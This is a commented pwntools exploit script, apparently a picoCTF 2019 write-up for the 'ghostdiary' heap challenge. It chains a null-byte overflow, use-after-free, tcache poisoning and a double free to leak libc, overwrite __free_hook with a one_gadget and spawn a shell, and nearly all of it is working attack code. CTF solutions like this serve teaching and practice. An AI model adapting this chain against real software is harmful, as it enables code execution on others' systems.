#ghostdiary solve by kl3pt0m4n1ac, pico2019
#Note: I used the below link as a reference for making this exploit, it outlines the basics of tcache exploitation
### http://eternal.red/2018/children_tcache-writeup-and-tcache-overview/

#This binary uses a tcache implementation of the heap and has a single null byte overflows
#The binary also has a use-after-free vuln that can be used to leak addresses
#The heap sizes able to be allocated in this binary ranges from 0x20-0xf0, and 0x120-0x1f0

#The main functions of the binary are the following:
#New Page: Make heap allocation of specified size using malloc
#Talk: Write to specified heap chunk
#Listen: Get content in specified heap chunk
#Burn Page: Free heap chunk
#Sleep: Quit program
from pwn import *
#context.terminal = ['tmux', 'splitw', '-h']

#First I set up basic methods to interact with the program
def new_page(num_pages, size):
    #max size per page 244
    sh.sendlineafter("> ", "1")
    sh.sendlineafter("> ", num_pages)
    sh.sendlineafter(": ", size)

def talk(page, content):
    sh.sendlineafter("> ", "2")
    sh.sendlineafter(": ", page)
    sh.sendlineafter(": ", content)

def listen(page):
    sh.sendlineafter("> ", "3")
    sh.sendlineafter(": ", page)
    sh.recvuntil("Content: ")
    content = sh.recvline().rstrip()
    return content

def burn(page):
    sh.sendlineafter("> ", "4")
    sh.sendlineafter(": ", page)

def sleep():
    sh.sendlineafter("> ", "5")

#raw=False for use on WSL
sh = process('./ghostdiary', raw=False)

#I Start by making 3 pages.
#Page 1 is specifically designed to be 8 less than 0xb0 so it can overwrite the previous size of 2 and have a null byte overwrite of page 2's size field
#Page 2 has a heap of size 0x120, the smallest size over 0x100 the binary allows 
new_page("1", "178") #First allocation: page 0 heap size 0xa0
new_page("1", "168") #Second allocation: page 1 heap size 0xb0
new_page("2", "280") #Third allocation: page 2 heap size 0x120

#When we overwrite the size value of page 2 to 0x100, this will give it a next size of 0x20
#0x100+0x20 = 0x120, so this will keep heap integrity 
payload = "a"*0xf8
payload += p64(0x21)
payload += p64(0x20)
talk("2", payload)

#Fill up the tcache slots for sizes 0xa0
for i in range(0, 7):
    new_page("1", "178") #pages 3-9
for i in range(3, 10):
    burn(str(i))
#Fill up tcache slots for sizes 0xb0
for i in range(0, 7):
    new_page("1", "168") #pages 3-9
for i in range(3, 10):
    burn(str(i))
#Fill up tcache slots of size 0x120, but then use the null byte overwrite to make them 0x100
#adding the p64(0x100) makes sure they have a valid previous size and will not cause an erro rwith free
#note that the first one's size has not yet been adjusted
for i in range(0, 7):
    new_page("2", "280") #pages 3-9
for i in range(3, 10):
    talk(str(i), "A"*272+p64(0x100))

#leak a heap address from one of previously made heap allocations in the tcache 
new_page("1", "178")
address = listen("10")
heap = int(unpack(address, 'all', endian='little', sign=False))
print(hex(heap))

#This next part is to pass integrity checks from future changes that will be made to the heap
#This will be accessing the first allocation made to the heap at page 0
#Soon I will set the previous size of are 3rd allocation to 0x150
#To pass the integrity checks you need to make the heap believe its at the beginning of the heap 
payload = "A"*16			#buffer to get to 3rd allocation-0x150
payload += p64(0x0)			#previous size of 0 since its the beginning of the heap
payload += p64(0x150)		#Size field of heap 
payload += p64(heap-0x640)	#location of heap
payload += p64(heap-0x640)	#location of heap
talk("0", payload)

burn("10") #ensure tcache for size 0xc0 is full
burn("0")  #have are first allocation go to the unsorted bin

#Next open up a free slot in the tcache for size 0xb0
new_page("1", "168") #page 0
#This overflows the size bit of the first of our size 0x120 heap chunks (now size 0x100) and sets its previous size to 0xb0 to maintain integrity
talk("0", "A"*160+p64(0xb0))

#Now the tcache for heap size 0x100 is freed up
for i in range(3, 10):#free pages 3-9
    burn(str(i))

#now change the previous size of are 3rd allocation to 0x150
payload = "A"*160
payload += p64(0x150)
talk("1", payload)

burn("0") #fill tcache for size 0xb0

#Next free the third allocation
#Since the size 0x100 tcache is full, this is put in the unsorted bin
#Since the heap was tricked into believing the heap began at the first chunk+0x10,
#this chunk will merge with that part of the first chunk in the unsorted bin
burn("2")

#free the tcache for size 0xa0
for i in range(0, 7):#pages 0, 2, 3, 4, 5, 6, 7
    new_page("1", "178")

#allocate at first allocation so it leaves unsorted bin
new_page("1", "178")#page 8

#This next chunk will get allocated at are fake starting point and allocate up to the beginning of the second chunk
new_page("1", "152")#page 9
#This chunk is made at the same allocation as are first chunk in the unsorted bin
#not only do we have 2 chunks in the same spot now allowing a double free, but
#it also has a libc address from the main arena in it
#This libc address can be leaked by listening to our first allocation, since tcache chunks do not have there 1st 8 bytes zeroed
#out like unsorted chunks do
new_page("1", "152")#page 10

#leak libc address
address = listen("1")
libc = int(unpack(address, 'all', endian='little', sign=False))
#calculate base address
libc -= 0x3ebca0
print(hex(libc))
#calculate address of __free_hook and are one_gadget
free_hook = p64(libc+0x3ed8e8)
one_gadget = p64(libc+0x4f322)
#Double free since these point to the same heap allocation
burn("10")
burn("1")

new_page("1", "152") #page 1

#Free hook's address will be put in the free list due to the double free
talk("1", free_hook) 
#Fill chunk to get to free hook
new_page("1", "152") #page 10
#This next allocation will be free hook, so whatever value written to the heap will be the value of __free_hook
new_page("1", "152") #page 11
#__free_hook=one gadget
talk("11", one_gadget)
#Triggering Free calls __free_hook, which points to the one gadget, landing a shell
burn("1")
sh.interactive()
